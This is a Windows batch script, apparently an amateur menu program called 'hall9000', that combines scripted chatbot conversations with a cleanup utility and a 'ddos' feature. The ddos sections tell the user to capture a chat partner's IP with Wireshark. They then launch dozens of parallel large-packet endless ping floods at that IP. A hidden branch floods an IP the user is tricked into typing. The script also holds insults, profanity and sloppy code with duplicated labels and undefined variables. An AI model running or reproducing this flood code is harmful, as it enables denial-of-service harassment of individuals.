start chrome.exe
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:matrix
echo.
echo thank you for using hall9000 services
echo type in matrix to begin
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p matirx123=
if %matirx123%== matrix goto delete
if %matirx123%== back goto hl9k
if %matirx123%== exit goto exit 

:ddos
echo.
echo what is the ip that you want to ddos
set /p ip=
echo is %ip% correct?
set /p thankyou=
if %thankyou%== yes goto ping
if %thankyou%== no goto ddos

:ddostool
echo.
echo before we begin to find someones ip you need to be talking to him on:
echo steam chat,skype,omegle
echo when you have done that type in continue
set /p cnt200=
if %cnt200%== continue goto instruction2

:instruction2
echo you will be provided with a program called wireshark
echo in the section called "using this fillter" type in "udp"
echo a lot of ip's will pop up
echo whait for about 10 seconds and click the red button on top
echo one of those will be someones ip
start wireshark.exe
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo laoding...
ping localhost -n 2 >nul
cls
echo connected
echo when you have the ip press any button to continue
pause
echo please insert the ip you whant to ddos
set /p ip=
echo type in continue to ddos
set /p answer200=
if %answer200%== continue goto ddosping

:ddosping
color 17
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:hl9
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
cls
pause
echo hi there
echo this is the place where you choose
echo do you want to go with conversation1
echo or with conversation2
echo or with conversation3
echo conversation1 offers a nice conversation about videogames
echo conversation2 offers a conversation about movies
echo conversation3 offers a conversation about music
set /p choosen=
if %choosen%== conversation1 goto conversation1
if %choosen%== conversation2 goto conversation2
if %choosen%== conversation3 goto conversation3

:conversation3
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great3
if %emotion%== good goto good3
if %emotion%== bad goto bad3
if %emotion%== sad goto Sad3
if %emotion%== amaechoing goto amaechoing3
if %emotion%== fine goto fine3

:fine3
color 03
echo i guess thats not bad...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:amaechoing3
color 06
echo wonderfull,lets start
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:good3
color 3
echo thats nice
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:Sad3
color 5
echo whell i hope i will change that
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:bad3
color 4
echo thats bad to hear...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:great3
color 2
echo thats wonderfull
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:music123
echo.
echo you have chosen my music services
echo to download music for free type in musicfree
echo to play music start up fucking media player
echo to buy music,i dont know,i dont sell any 
echo to listen to music on youtube type in youtube
echo to download youtube videos type in videodownloader
set /p answergiven123=
if %answergiven123%== musicfree goto mp3juices
if %answergiven123%== youtube goto youtube2
if %answergiven123%== videodownloader goto 10youtube

:conversation2
echo.
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great2
if %emotion%== good goto good2
if %emotion%== bad goto bad2
if %emotion%== sad goto Sad2
if %emotion%== amaechoing goto amaechoing2
if %emotion%== fine goto fine2

:fine2
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:amaechoing2
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:great2
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:good2
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:Sad2
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:bad2
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:thoughts1
echo. 
echo so what did you think about it
echo did you like it?
set /p sqloved=
if %sqloved%== yes goto sqloved1
if %sqloved%== no goto sqloved2

:sqloved1
echo. 
echo whell thats your thoughts
echo i didnt 
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:sqloved2
echo. 
echo whell thats your thoughts
echo i didnt either
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:thoughts2
echo.
echo whell dont watch it
echo its a peace of shit movie
echo the rating are right for it
echo dont spend your time
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron man
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:whiplash1
echo.
echo wow,not many have wathced that one
echo but i love it
echo its amaechoing that someone else i can speak to has watched it too
echo whell that was it for now
echo we can continue our conversation another time
echo if you want to talk to me for longer choose conversation1
echo thank you for talking with me
echo and will see eachother later
echo bye
set /p idontlikethis=
if %idontlikethis%== bye goto bb8

:bb8
echo.
echo %random%

:conversation1
echo .
echo you have chosen conversation1
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great
if %emotion%== good goto good
if %emotion%== bad goto bad
if %emotion%== sad goto Sad
if %emotion%== amaechoing goto amaechoing
if %emotion%== fine goto fine

:fine
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:amaechoing
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:great
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:loot
echo.
echo I love borderlands 
echo its a wonderfull looting game
echo i love looting games
echo do you like them too?
set /p looter=
if %looter%== yes goto loveyou
if %looter%== no goto understand

:loveyou
echo.
echo I love you dude
echo Its like speaking to myself
echo but we can talk about it later
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:understand
echo.
echo why are you playing borderlands then
echo never mind,i dont need to know
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:fucked
echo.
echo you still play that shit %name%?
set /p answer=
if %answer%== yes goto bad4u
if %answer%== no goto good4u

:me2
echo.
echo good,i liket that game too
echo now,whats your favorite csgo team?
set /p topic=
if %topic%== cloud9 goto yay
if %topic%== envyus goto nay

:bad4u
echo.
echo your a pease of shit
echo i dont want to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good4u
echo.
echo fewh,i though you still played it
echo now we can continue our conversation
echo do you have a pet?
set /p pet=
if %pet%== yes goto metwo
if %pet%== no goto whynot

:yay
echo.
echo thats a great one i like it too
echo but i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:nay
echo.
echo thats great
echo i dont like them though
echo i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:metwo
echo.
echo thats great i have one too
echo is it a dog or cat or other?
set /p animal=
if %animal%== dog goto dogs
if %animal%== cat goto cats
if %animal%== other goto else

:whynot
echo.
echo whell thats too bad for you
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:mobagame
echo.
echo oh i know that one but i have never played it
echo can you excplain what type of game it is
set /p mobaexplained=
if %mobaexplained%== yes goto mobaexplained1
if %mobaexplained%== no goto explanation2
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2

:mobaexplained1
echo.
echo so what is it?
set /p exposed=
if %exposed%==moba goto thanks

:many
echo.
echo Many people play that game in my class
echo but i dont like it
echo just one thing
echo can you excplain what RP means in samp?
set /p rollplaying1=
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2
if %rollplaying1%== yes goto explanation1
if %rollplaying1%== nope goto explanation2

:explanation1
echo.
echo so what is it?
set /p rpa=
if %rpa%== rollplaying goto thanks

:explanation2
echo.
echo whell fuck you then
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:thanks
echo.
echo thanks for excplaining but i need to go
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:lier
echo.
echo why are you lying to me
echo i dont whant to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:bad
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:Sad 
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:dogs
echo.
echo mine is a dog too
echo i love dogs
echo i think you might too
echo we can talk later,ok?
set /p then=
if %then%== ok goto badboy
if %then%== no goto whelltoobad

:cats
echo. I hate cats
echo.i dont want to talk to you
echo.bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:else
echo.
echo whell you can tell me about it latter
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:badboy
echo.
echo whait,i changed my mind.
echo we can still talk
echo heres a nother question
echo whats your favorite browser
set /p browser=
if %browser%== googlechrome goto browser
if %browser%== moechoila goto bowser

:browser
echo.
echo thats my favorite one too
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:bowser
echo.
echo many people like that one but i dont like it
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:os1
echo. 
echo whell i use that one too
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os2
echo. 
echo why are you still using that
echo the windows 10 upgrade was free
echo and windows 10 is way batter than 8
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os3
echo. 
echo whell i used to use that one too
echo but now i upgraded to windows10 wich was free
echo and its way better
echo but it is your dicition
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os4
echo. 
echo i asked for computer not mobile
echo oh and we have a apple user here 
echo yay
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os5
echo. 
echo whell either your a hacker or veary old and dont know anything about computers
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os6
echo. 
echo i asked for computer os not phone
echo oh and btw nice choice i use that one too
echo its veary good
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os7 
echo. 
echo fucking osx,you use apple software on a computer
echo you do know that windows is the way to go with computers
echo the phone side is diferant
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:finnaly1
echo.
echo really,you know him
echo whell if you do tell him this
echo hes one good of a program maker 
echo hes the one that made me
echo and now for real will be saying goodbye to eachother
echo thanks for having this coversation with me
echo i love you for talking to me
echo for now bye and will see eachother later
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2

:finnaly2
echo.
echo too bad, you lied to me!!! TTYL!!!
echo i will talk to you soon right?
set /p what=
if %what%==yes goto delete
if %what%==no goto delete
goto delete

:finnaly3
echo.
echo welcome my master
echo welcome to the matrix
echo where you can have all knowladge that has ever excisted
echo welcome to the deep web
start https://www.torproject.org/download/download
echo bye for now
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2 

:finnally4
echo.
echo what is your ip addres?
set /p ipaddress=
echo is this right? %ipaddress%
echo if its right type in yes
set /p answer=
if %answer%== yes goto answeripconfig
if %answer%== no goto finally4

:answeripconfig
echo.
echo thank you for your ip
echo bye
set /p goodbye=
if %goodbye%== bye goto celcius

:celcius
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000

set /p gitrekt=
if %gitrekt%== nooo goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:b2
echo bye
set /p b21=
if %b21%== bye goto cls
echo
echo
echo
cls

:cls123
cls
pause

:cls
cls

:adminacc
echo.
echo ========================================
echo H A L L 9 0 0 0   P R O    E D I T I O N
echo ========================================
echo administrator privilege active
echo please insert a command number
echo standard mode (1)
echo advanced mode (2)
set /p enter1=ENTER:
if %enter1%== 1 goto hl9k
if %enter1%== 2 goto advancedmd

:advancedmd
title PC Cleanup Utility http://www.youtube.com/user/techki-tv
goto menu2
:menu2
cls
echo --------------------------------------------------------------------------------
echo PC Cleanup Utility
echo --------------------------------------------------------------------------------
echo.
echo Select a tool
echo =============
echo.
echo [1] Delete Internet Cookies
echo [2] Delete Temporary Internet Files
echo [3] Disk Cleanup
echo [4] Disk Defragment
echo [5] Exit
echo.
set /p op=Run:
if %op%==1 goto 1
if %op%==2 goto 2
if %op%==3 goto 3
if %op%==4 goto 4
if %op%==5 goto exit
goto error
:1
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Deleting Cookies...
ping localhost -n 3 >nul
del /f /q "%userprofile%\Cookies\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Cookies deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:2
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Deleting Temporary Files...
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Temporary Internet Files deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:3
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Running Disk Cleanup...
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
